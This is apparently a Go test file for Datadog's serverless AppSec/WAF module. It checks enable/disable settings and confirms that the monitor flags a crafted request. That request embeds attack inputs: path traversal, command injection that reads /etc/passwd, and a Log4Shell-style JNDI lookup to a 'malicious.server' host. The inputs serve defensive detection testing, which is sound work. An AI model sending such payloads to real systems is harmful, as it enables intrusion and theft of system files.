// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2016-present Datadog, Inc.

package appsec_test

import (
	"testing"

	"github.com/DataDog/datadog-agent/pkg/serverless/appsec"
	"github.com/DataDog/datadog-agent/pkg/serverless/appsec/httpsec"
	"github.com/DataDog/datadog-agent/pkg/serverless/appsec/waf"
	"github.com/stretchr/testify/require"
)

func TestNew(t *testing.T) {
	if err := waf.Health(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Run("appsec disabled", func(t *testing.T) {
		t.Setenv("DD_APPSEC_ENABLED", "false")
		asm, _ := appsec.New()
		require.Nil(t, asm)
	})

	t.Run("appsec enabled", func(t *testing.T) {
		t.Setenv("DD_APPSEC_ENABLED", "true")
		asm, err := appsec.New()
		require.NoError(t, err)
		require.NotNil(t, asm)
	})
}

func TestMonitor(t *testing.T) {
	if err := waf.Health(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Setenv("DD_APPSEC_ENABLED", "true")
	asm, err := appsec.New()
	require.NoError(t, err)
	require.Nil(t, err)

	uri := "/path/to/resource/../../../../../database.yml.sqlite3"
	ctx := &httpsec.Context{
		RequestRawURI: &uri,
		RequestHeaders: map[string][]string{
			"user-agent": {"sql power injector"},
		},
		RequestQuery: map[string][]string{
			"query": {"$http_server_vars"},
		},
		RequestPathParams: map[string]string{
			"proxy": "/path/to/resource | cat /etc/passwd |",
		},
		RequestBody: "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
	}
	events := asm.Monitor(ctx.ToAddresses())
	require.NotNil(t, events)
}
